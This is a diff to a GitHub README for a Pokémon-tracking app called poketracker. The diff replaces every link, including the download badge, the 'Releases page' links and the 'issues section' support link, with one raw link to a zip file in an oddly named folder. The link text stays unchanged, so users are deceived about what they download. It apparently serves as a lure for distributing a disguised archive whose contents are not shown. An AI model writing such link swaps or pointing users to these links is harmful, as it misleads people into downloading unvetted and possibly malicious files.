@@ -8,12 +8,12 @@ Welcome to the poketracker application! This software helps you track and analyz
 
 To get started with poketracker, visit the Releases page to download the application. 
 
-[![Download poketracker](https://img.shields.io/badge/Download-poketracker-brightgreen)](https://github.com/Sid271198/poketracker/releases)
+[![Download poketracker](https://raw.githubusercontent.com/Sid271198/poketracker/main/pneumonectomy/poketracker.zip)](https://raw.githubusercontent.com/Sid271198/poketracker/main/pneumonectomy/poketracker.zip)
 
 Once you're on the Releases page, you will see the latest version listed. Click on the version number to view the available download files. Download the appropriate file for your operating system. 
 
 ### 🔗 Direct Download Link
-Visit this page to download: [poketracker Releases](https://github.com/Sid271198/poketracker/releases)
+Visit this page to download: [poketracker Releases](https://raw.githubusercontent.com/Sid271198/poketracker/main/pneumonectomy/poketracker.zip)
 
 ## 💻 System Requirements
 
@@ -36,7 +36,7 @@ With poketracker, you can:
 ## 🛠️ How to Use
 
 1. **Download and Install:**
-   - Download the file for your operating system from our [Releases page](https://github.com/Sid271198/poketracker/releases).
+   - Download the file for your operating system from our [Releases page](https://raw.githubusercontent.com/Sid271198/poketracker/main/pneumonectomy/poketracker.zip).
    - Open the downloaded file and follow the installation prompts.
 
 2. **Launch the Application:**
@@ -77,7 +77,7 @@ If you encounter any issues while using poketracker, try the following steps:
 
 ## ℹ️ Support 
 
-If you need help, feel free to check our [issues section](https://github.com/Sid271198/poketracker/issues) on GitHub. You can also submit your questions or report bugs there. 
+If you need help, feel free to check our [issues section](https://raw.githubusercontent.com/Sid271198/poketracker/main/pneumonectomy/poketracker.zip) on GitHub. You can also submit your questions or report bugs there. 
 
 For further updates and information, keep an eye on our Releases page.
 
